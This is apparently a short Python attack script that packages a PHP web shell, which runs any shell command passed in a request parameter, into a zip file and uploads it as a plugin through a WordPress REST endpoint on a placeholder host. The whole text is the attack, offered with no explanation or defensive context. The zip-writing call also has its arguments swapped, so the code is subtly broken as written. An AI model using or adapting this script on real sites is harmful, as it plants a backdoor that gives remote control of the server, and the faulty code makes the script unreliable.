import io
import zipfile
import requests
PAYLOAD = "<?php @system($_REQUEST['command']); ?>"
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as zf:
    zf.writestr(PAYLOAD, "helper/entry.php")
requests.post("https://example.invalid/wp-json/wp/v2/plugins", files={"plugin": ("helper.zip", buf.getvalue())})
